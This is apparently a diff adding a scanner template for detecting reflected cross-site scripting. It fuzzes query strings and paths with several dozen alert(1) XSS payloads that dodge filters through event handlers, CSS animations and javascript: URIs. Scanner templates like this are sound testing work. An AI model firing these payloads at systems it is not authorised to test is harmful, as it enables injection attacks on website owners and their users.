@@ -1,0 +1,92 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>"
+        - "<marquee draggable=\"true\" ondragleave=\"alert(1)\">test</marquee>"
+        - "<map draggable=\"true\" ondragleave=\"alert(1)\">test</map>"
+        - "<;STYLE>;BODY{background-image: url(;<A HREF=;</img/onerror=';alert(1);';>;"
+        - "<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></optgroup>"
+        - "<font id=x tabindex=1 onactivate=alert(1)></font><input autofocus>"
+        - "<svg><output onload=alert(1)>"
+        - "<script src=\"data://text/html,javascript:javascript:alert(1);\"></script>//&nbsp;"
+        - "<del id=x tabindex=1 onactivate=alert(1)></del>"
+        - "<script>alert(1)</script>"
+        - "<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>"
+        - "<nobr id=x tabindex=1 onactivate=alert(1)></nobr>"
+        - "<style>@keyframes slidein {}</style><optgroup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></optgroup>"
+        - "<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>"
+        - "<body style=\"x:\\expression(javascript:alert(1))\">"
+        - "<script type=\"text/javascript\">javascript:alert(1);</script>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></li>"
+        - "<audio autoplay controls ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<menuitem draggable=\"true\" ondragleave=\"alert(1)\">test</menuitem>"
+        - "<xmp draggable=\"true\" ondragleave=\"alert(1)\">test</xmp>"
+        - "<body id=x tabindex=1 onbeforeactivate=alert(1)></body>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>"
+        - "<nobr onbeforecut=\"alert(1)\" contenteditable>test</nobr>"
+        - "<img src=\"&#1;&#2;javascript:alert('XSS');\">"
+        - "<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>"
+        - "<marquee draggable=\"true\" ondragleave=\"alert(1)\">test</marquee>"
+        - "<optgroup draggable=\"true\" ondragend=\"alert(1)\">test</optgroup>"
+        - "<dl draggable=\"true\" ondragleave=\"alert(1)\">test</dl>"
+        - "<style>:target {color:red;}</style><object id=x style=\"transition:color 1s\" ontransitionrun=alert(1)></object>"
+        - "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationend=\"alert(1)\"></h1>"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output>"
+        - "<style>:target {transform: rotate(180deg);}</style><button id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></button>"
+        - "<dl draggable=\"true\" ondragleave=\"alert(1)\">test</dl>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><svg id=x ondragover=alert(1) contenteditable>drop here</svg></div>"
+        - "<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>"
+        - "<SCRIPT>alert(1)</SCRIPT"
+        - "<style>@keyframes slidein {}</style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></dialog>"
+        - "<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>"
+        - "<iframe src=\"javascript:alert(1)\"></iframe>"
+        - "<plaintext draggable=\"true\" ondragend=\"alert(1)\">test</plaintext>"
+        - "<style>@keyframes x{}</style><progress style=\"animation-name:x\" onanimationend=\"alert(1)\"></progress>"
+        - "<marquee style=\"background-image:url('javascript:alert(1)')\">"
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "<map draggable=\"true\" ondragend=\"alert(1)\">test</map>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
